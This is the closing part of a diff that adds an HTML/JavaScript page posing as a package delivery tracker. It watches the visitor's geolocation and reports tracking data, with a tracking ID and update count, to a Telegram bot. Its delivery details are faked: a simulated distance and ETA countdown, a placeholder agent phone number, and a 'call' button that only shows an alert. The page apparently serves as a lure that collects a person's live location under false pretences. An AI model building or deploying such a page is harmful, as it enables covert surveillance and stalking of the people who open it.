+                    errorMsg = 'Location information is unavailable. Try moving to an area with better signal.';
+                    hasLocationPermission = true;
+                    break;
+                case error.TIMEOUT:
+                    errorMsg = 'Location request timed out. Please check your internet connection and try again.';
+                    hasLocationPermission = true;
+                    break;
+            }
+            
+            // Update UI
+            locationStatusText.textContent = 'Location access failed';
+            pulseDot.classList.add('error');
+            pulseDot.style.animation = 'none';
+            coordinatesDisplay.textContent = 'Location: Not available';
+            lastUpdateTime.textContent = 'Last updated: --';
+            
+            // Show error message
+            showLocationError(errorMsg);
+            
+            // Disable stop tracking button if we never got permission
+            if (!hasLocationPermission) {
+                stopTrackingBtn.disabled = true;
+                stopTrackingBtn.innerHTML = '<span>⚠️ Location Disabled</span>';
+            }
+        }
+        
+        // Show location error in tracking section
+        function showLocationError(message) {
+            locationErrorText.textContent = message;
+            locationError.style.display = 'block';
+        }
+        
+        // Hide location error
+        function hideLocationError() {
+            locationError.style.display = 'none';
+        }
+        
+        // Stop location sharing
+        function stopLocationSharing() {
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+            }
+            
+            if (locationUpdateInterval) {
+                clearInterval(locationUpdateInterval);
+                locationUpdateInterval = null;
+            }
+            
+            isTracking = false;
+            
+            // Update UI
+            locationStatusText.textContent = 'Location sharing stopped';
+            pulseDot.style.animation = 'none';
+            pulseDot.style.backgroundColor = '#dc3545';
+            
+            // Send stop notification to Telegram
+            if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && locationUpdateCount > 0) {
+                const stopData = {
+                    trackingId: trackingId,
+                    message: 'Location sharing stopped by user',
+                    totalUpdates: locationUpdateCount,
+                    timestamp: new Date().toISOString()
+                };
+                
+                sendToTelegramBot(stopData);
+            }
+        }
+        
+        // Call delivery agent (simulated)
+        function callDeliveryAgent() {
+            const phoneNumber = orderData.agentPhone || '+91 98765 43210';
+            if (confirm(`Call delivery agent ${orderData.agentName} at ${phoneNumber}?`)) {
+                // In a real app, this would initiate a call
+                // For demo, just show a message
+                alert(`Calling ${orderData.agentName} at ${phoneNumber}...\n\n(In a real app, this would initiate a phone call)`);
+            }
+        }
+        
+        // Simulate distance updates
+        function startDistanceSimulation() {
+            let distance = parseFloat(orderData.initialDistance) || 1.2;
+            let time = parseInt(orderData.initialETA) || 25;
+            
+            const distanceInterval = setInterval(() => {
+                if (!isTracking) {
+                    clearInterval(distanceInterval);
+                    return;
+                }
+                
+                // Reduce distance and time
+                if (distance > 0.1) {
+                    distance -= 0.1;
+                    time = Math.max(1, time - 2);
+                    
+                    distanceAway.textContent = `${distance.toFixed(1)} km`;
+                    eta.textContent = `${time} min`;
+                    
+                    // If close to delivery, update status
+                    if (distance < 0.5 && orderData.status === 'Out for Delivery') {
+                        document.getElementById('agentStatus').textContent = 'Almost at your location';
+                    }
+                    
+                    // If delivered
+                    if (distance <= 0.1) {
+                        distanceAway.textContent = 'Arrived';
+                        eta.textContent = 'Now';
+                        document.getElementById('agentStatus').textContent = 'Package delivered';
+                        document.getElementById('orderStatus').textContent = 'Delivered';
+                        updateProgressBar('Delivered');
+                        stopLocationSharing();
+                        clearInterval(distanceInterval);
+                    }
+                }
+            }, 30000); // Update every 30 seconds
+        }
+        
+        // UI Helper Functions
+        function showLoading() {
+            trackingInputSection.style.display = 'none';
+            trackingDisplaySection.style.display = 'none';
+            loadingSection.style.display = 'block';
+        }
+        
+        function hideLoading() {
+            loadingSection.style.display = 'none';
+        }
+        
+        function showTrackingDisplay() {
+            trackingInputSection.style.display = 'none';
+            trackingDisplaySection.style.display = 'block';
+        }
+        
+        function showTrackingInput() {
+            trackingInputSection.style.display = 'block';
+            trackingDisplaySection.style.display = 'none';
+            
+            // Clear input and focus
+            trackingIdInput.value = '';
+            trackingIdInput.focus();
+            
+            // Reset tracking state
+            stopLocationSharing();
+        }
+        
+        // Initialize app when DOM is loaded
+        document.addEventListener('DOMContentLoaded', initApp);
+    </script>
+</body>
+</html>
